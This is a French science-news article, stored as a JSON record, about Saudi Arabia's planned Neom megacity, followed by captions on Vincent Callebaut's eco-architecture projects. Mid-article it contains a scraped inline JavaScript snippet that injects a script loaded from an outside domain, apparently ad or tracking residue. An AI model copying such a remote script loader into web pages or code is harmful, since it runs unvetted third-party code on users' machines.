{"title": "Villes du futur : Neom, la megapole high-tech voulue par l'Arabie saoudite", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-10-25", "content": "Le prince heritier de l'Arabie saoudite Mohammed ben Salmane Al Saoud a annonce la construction d'une ville futuriste au nord-ouest du pays, sur les bords de la mer Rouge. Baptisee Neom, cette megapole promet d'embrasser les dernieres technologies en matiere d'energies renouvelables, d'architectures et de transports. Un projet pharaonique a 500 milliards de dollars... Eriger une megapole a la pointe du progres tant dans ses infrastructures que dans la qualite de vie qu'elle offrira a ses habitants. Tel est l'objectif de  Neom , une ville ultra futuriste que l'Arabie Saoudite entend batir en partant d'une feuille blanche. Voulue par le prince heritier de l'Arabie saoudite, Mohammed ben Salmane Al Saoud, Neom (ou Neo-Mostaqbal qui signifie << nouveau futur >>) sera implantee au nord-ouest du pays, sur les bords de la mer Rouge, dans une zone pour le moment desertique. A terme, cette vaste zone de developpement economique de 26.500 km2 s'etendra sur tout le pourtour du golfe d'Aqaba, englobant les rives de l'Egypte et de la Jordanie sur 460 kilometres de cotes. L'Arabie saoudite et ses premiers partenaires comptent investir 500 milliards de dollars pour concretiser cette vision. Sur le site  Neom , le projet est decrit en des termes grandiloquents par ses promoteurs qui promettent des batiments et des infrastructures qui resteront immacules grace a l'absence de pollution atmospherique, un  air  pur et frais ou encore le plus grand jardin au coeur d'une metropole. Cette  ville du futur  entend aussi revolutionner l'alimentation de ses citoyens grace a l' agriculture  verticale, le developpement de cultures en zones arides et en eau de mer ainsi que l'utilisation de serres photovoltaiques.  La zone en rouge montre le projet initial pour la megapole Neom implantee en Arabie saoudite. Mais a terme, il est prevu qu'elle s'etende aux rives de l'Egypte et de la Jordanie dans le golfe d'Aqaba.(c) Google Maps                               Voitures autonomes et drones taxis dans Neom La megapole s'appuiera massivement sur les  energies renouvelables , avec des  fermes eoliennes  et photovoltaiques et des systemes de stockage d'energie a grande echelle. Il est egalement question d'un programme de dessalement de l'eau de mer. Les transports occuperont evidemment une place centrale dans ce projet. Et comme on peut s'y attendre, il s'agira de solutions autonomes et ecologiques. Bien qu'aucun detail n'ait encore ete divulgue a ce sujet, les voitures et transports en commun autonomes et les  drones taxis  sont cites en bonne place.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Plus concretement, Neom sera une zone de developpement economique dotee d'une legislation et d'une fiscalite specifiques destinees a favoriser les investissements et attirer les competences humaines. Plusieurs secteurs-cles sont cibles, notamment les  biotechnologies .  << Le monde se tournera vers Neom pour la prochaine generation de  therapie genique , la  genomique , la recherche sur les  cellules souches , la nano-biologie et la bio-ingenierie >> , peut-on lire sur le site promotionnel. La premiere phase du projet Neom achevee en 2025 Neom ambitionne egalement d'etre a l'avant-garde dans les domaines de l' Internet des objets , de l' impression 3D , de la  robotique , des  nanotechnologies  mais aussi de l'industrie des loisirs (cinema, TV, jeux video...). La encore, il sera question d'attirer des entreprises et des experts qui donneront corps a cette vision qui ne s'appuie pour le moment sur aucun projet concret. Pour couronner le tout, Neom sera une << plateforme open source >> que les  data scientists , les experts en analyse de  donnees massives , pourront venir etudier afin d'evaluer l'impact de cet urbanisme high-tech et des diverses innovations mises en oeuvre.  La premiere phase du projet Neom doit etre achevee en 2025. En 2030, ses promoteurs predisent que la ville contribuera a hauteur de 100 milliards de dollars a l'economie saoudienne (voir document PDF sur les donnees chiffrees du projet  Neom ) qui est engagee dans une vaste diversification pour ne plus dependre que de l'or noir. Bien entendu, il convient de ponderer un minimum ce tableau d'une ville ideale et d'attendre de voir ce qui pourra reellement se concretiser. Mais il est rare d'avoir l'opportunite de suivre la creation d'une ville futuriste a partir d'une feuille blanche, qui plus est portee par une puissance financiere presque sans limites. Ce qu'il faut retenir Face a la perspective de la fin du tout petrole, l'Arabie saoudite s'est engagee dans une grande refonte de son economie. Avec Neom, le royaume veut creer une megapole futuriste exemplaire d'un point de vue environnemental, et attractive pour les secteurs economiques de pointe. Photos : Balades dans les villes du futur bioniques de Vincent Callebaut L'arche bionique de Taiwan : la nature a la verticale                                       Dans le parc Gateway de Taichung, a Taiwan, cette tour est comme une foret dans la ville. Des prairies et des jardins s'etalent en palier sur 390 m de hauteur dans un batiment autosuffisant, grace aux energies solaire et eolienne. On s'y promene pour apprecier la nature et pour trouver une vision panoramique sur la megalopole. La tour sert aussi pour les relais de telecommunications. (c) Vincent Callebaut                                                                       L'arche bionique de Taiwan : une tour autosuffisante                                       Outre des panneaux solaires, trois eoliennes a axes verticaux fournissent l'energie electrique. Les vitres, par effet de serre, assurent un apport thermique aux espaces interieurs. (c) Vincent Callebaut                                                                       L'arche bionique de Taiwan : un poumon dans la ville                                       La tour du parc Gateway n'accueille pas d'habitations, ni de bureaux, ni de centres commerciaux. C'est un jardin dans la ville qui emet de l'oxygene, absorbe le gaz carbonique et ou l'on se promene devant le paysage urbain. (c) Vincent Callebaut                                                                       L'arche bionique de Taiwan : un exosquelette pour abriter la verdure                                       La structure en exosquelette est concue pour resister aux seismes, aux vents, voire a des attaques terroristes. Les niveaux horizontaux sont a double pont pour faciliter la maintenance. (c) Vincent Callebaut                                                                       Les galets de Shenzen : un avant-gout de la cite du futur                                       Avec les six tours << Asian cairns >> de la ville chinoise de Shenzhen, l'architecte Vincent Callebaut propose un concept << biomimetique >> pour les cites surpeuplees du futur. Chacune est un ecosysteme urbain, avec une production agricole, une autosuffisance en energie et un recyclage des dechets. Elle abrite des habitations, des bureaux et des lieux de loisirs. (c) Vincent Callebaut                                                                       Les galets de Shenzen : un quartier autarcique                                       Les galets de chaque tour, qui abritent des fermes agricoles, s'organisent en une triple spirale autour d'un espace central qui est aussi une voie de communication entre tous les niveaux. La consommation de produits locaux est favorisee et l'etagement vertical densifie les habitations, ce qui limite l'etalement urbain. En 2030, un milliard de Chinois vivront en ville et il faut anticiper les problemes d'acheminement des vivres et des dechets, du transport des personnes et de la pollution. (c) Vincent Callebaut                                                                       Coral Reef : un nouveau village pour Haiti                                       Apres le desastre du seisme de 2010, Haiti est a reconstruire et le projet Coral Reef a debute en 2011 pour batir un millier de logements prefabriques en bord de mer, autonomes en energie. A partir d'un module unique, l'ensemble prend la forme de deux vagues, inspirees des recifs coralliens, menageant un espace central qui abrite un milieu naturel. (c) Vincent Callebaut                                                                       Coral Reef : des logements modulaires mais aux points de vue multiples                                       Chaque habitation est un module duplex, avec une structure metallique et des parements en bois tropicaux. Disposees en quinconce, elles offrent une multitude de points de vue et des facades vegetalisees. (c) Vincent Callebaut                                                                       Coral Reef : un projet evolutif, concu pour les energies renouvelables                                       L'ensemble est concu pour les energies renouvelables : vent, marees, soleil, difference de temperature entre les eaux de surface et la profondeur. Le projet est flexible et pourra evoluer au fil des besoins. (c) Vincent Callebaut                                                                       Dragonfly : un projet bionique pour New York                                       Ces deux ailes de libellule forment un ensemble d'habitation, de travail et de production agricole. Concu pour New York et ses fortes fluctuations de temperature, ce prototype menage en son centre un immense volume ferme par un voile de verre et d'acier. Les lieux habites se trouvent sur la circonference des ailes et l'espace entre les deux constitue une serre ou prennent place des cultures variees. La moitie de l'energie vient du bouclier photovoltaique sur la proue sud et l'autre de trois eoliennes. (c) Vincent Callebaut                                                                       Physalia : un vaisseau-amiral pour la bataille de l'eau                                       Au forum mondial de l'eau qui s'est tenu a Istanbul en 2009, un consensus s'est fait autour de l'imperieuse necessite d'accorder des moyens lourds pour que chaque etre humain ait acces a de l'eau potable. Un milliard de personnes en manquent mais bien peu est fait. Ce navire en forme de Physalie (un curieux animal cousin des coraux et des meduses), ce << morceau de terre vivante >>, selon Vincent Callebaut, est un projet pour promouvoir la bonne gestion de l'eau et des voies navigables. (c) Vincent Callebaut                                                                       Physalia : une vitrine des bonnes pratiques de gestion de l'eau                                       Physalia est destine a naviguer sur les grands fleuves d'Europe et d'ailleurs. Il serait une vitrine technologique. Autonome et non polluant, cette << agora flottante >> accueillerait des chercheurs du monde entier et le public pourrait y decouvrir les technologies les plus en pointe pour recycler les eaux domestiques, dessaler l'eau de mer ou depolluer les sols. (c) Vincent Callebaut                                                                       Lilypad : une ville flottante pour des mers qui montent                                       Prototype d'une cite amphibie, Lilypad pourrait abriter 50.000 personnes, par exemple les habitants de la cote rognee par la montee des eaux ou les refugies climatiques ultramarins qui auront du abandonner leurs iles natales. Elle comporte un lagon central d'eau douce venue de la pluie. Trois marinas et trois montagnes sont dediees, respectivement, au travail, au commerce et aux loisirs. (c) Vincent Callebaut                                                                       Lilypad : une cite propre et autonome                                       Cette << Ecopolis >> est totalement autonome, utilisant toutes les sources d'energie disponibles autour d'elle : soleil (thermique et photovoltaique), vent, courants de maree, pression osmotique, biomasse... Elle doit pouvoir produire davantage d'energie qu'elle n'en consomme. Elle porte des terres agricoles et des bassins d'aquaculture. Elle peut suivre les courants oceaniques. (c) Vincent Callebaut                                                                       Lilypad : une peinture depolluante                                       La structure de l'ile flottante est formee d'une double coque en fibres de polyester. Une couche de dioxyde de titane (TiO2) la recouvre. Sous l'effet des rayons ultraviolets, ce materiau peut absorber la pollution atmospherique par effet photocatalytique. (c) Vincent Callebaut                                                                       Solar Drop : une fleur en mer d'Oman                                       A Abou Dhabi, ce dome est installe dans la baie et accueille un centre de cure thermale et une piscine. Les sept lieux d'habitations sont situes a l'exterieur, au plus pres de l'eau, sur un cercle de 350 m de diametre. Le dome est surmonte de deux ellipses portant ce qui, vu de loin, apparait comme un motif d'inspiration arabe. En fait, une serie de seize spirales, sur le sommet, sont faites de cellules photovoltaiques. Autour, seize spirales sont plantees de vegetaux qui favorisent la fraicheur. (c) Vincent Callebaut                                                                       Solar Drop : un dome photovoltaique vegetalise                                       Le dome central est divise en trois zones, les << petales >>. La premiere est le lieu d'accueil (le << Majlis >>) et son hall de reception. Les deux autres sont le spa, avec la station de cure thermale, et une piscine interieure (il en existe aussi une a l'exterieur). (c) Vincent Callebaut                                                                       Solar Drop : une piscine-lagon                                       L'une des petales du dome abrite une piscine avec vue sur la mer d'Oman et s'entoure de plantes vertes. (c) Vincent Callebaut                                                                       King's forest : des chalets-feuilles au Maroc                                       Ces trois chalets sont des residences de luxe, pres de Fes, au Maroc, dans la foret de Louajriyine. Batis sur une pente, ils offrent une vision panoramique de presque 360deg sur les montagnes de l'Atlas, depuis un balcon entourant tous les espaces de vie. Ils prennent la forme d'une feuille, d'ailleurs la structure de la charpente en bois imite les nervures. (c) Vincent Callebaut                                                                       ", "theme": "maison"}